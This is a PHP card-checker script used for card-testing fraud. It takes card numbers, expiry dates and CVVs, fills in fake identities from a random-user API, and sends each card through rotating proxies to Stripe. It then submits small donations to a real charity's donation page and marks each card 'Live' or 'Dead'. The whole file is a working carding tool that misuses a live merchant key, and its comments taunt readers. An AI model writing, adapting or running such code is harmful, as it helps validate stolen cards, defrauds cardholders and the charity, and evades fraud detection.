<?php

//error_reporting(0);
extract($_GET);
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$seperator = explode("|", $check);
$cc = $seperator[0];
$mes = $seperator[1];
$ano = $seperator[2];
$cvv = $seperator[3];
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];


$username = 'USER';
$password = 'PASS';
$port = 22225;
$session = mt_rand();
$super_proxy = 'PROXY';
$url1 = 'https://api.stripe.com/v1/tokens';
$url2 = 'https://goodbricksapp.com/icsd.org/donate';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url1);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$postcode.'&guid=8b59c237-d0fc-48c3-85d9-6ecfe5dffb0e&muid=d8f5be88-11f0-4349-a90b-852c4aa05538&sid=3d157444-8704-4c30-afd5-ee6785a401c8&payment_user_agent=stripe.js%2Fe15944c8%3B+stripe-js-v3%2Fe15944c8&referrer=https%3A%2F%2Fgoodbricksapp.com%2Ficsd.org%2Fdonate&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$page = curl_exec($ch);
if(substr_count($page, 'incorrect') > 0){
  echo '<span class="label label-danger">Dead - '.$check.' - Invalid card number, y no es scam perro'.'#TESTE CHECKER PRO<br></span>';
  exit();
  }
$token = trim(strip_tags(getstr($page,'id": "','"')));
$ip = trim(strip_tags(getstr($page,'client_ip": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url2);
curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'token='.$token.'&clientIp='.$ip.'&categoryAmount=2&paymentIterations=0&startAt=07%2F29%2F2019&paymentInterval=MONTH&categoryName=fidyah&firstName='.$name.'&lastName='.$last.'&email='.$last.''.$name.'%40ke1.nl&customerEmailValidation=&phone='.$phone.'&addressStreet=&addressApt=&addressCity=&addressState=&addressZipCode=');
$page = curl_exec($ch);
curl_close($ch);
if(substr_count($page, "card_declined") > 0){
  echo '<span class="label label-danger">Dead - '.$check.' - Your card was declined'.'#UNC3NS0R3D<br></span>';
  }
  if(substr_count($page, "incorrect_cvc") > 0){
    echo '<span class="label label-danger">Dead - '.$check.' - Your card was declined'.'#UNC3NS0R3DO<br></span>';
    }
  if(substr_count($page, "incorrect_number") > 0){
    echo '<span class="label label-success">Live - '.$check.' - Your card was approved'.'#UNC3NS0R3D<br></span>';
}
//As you can see, legit tong checker to kaya putang ina kau.
?>
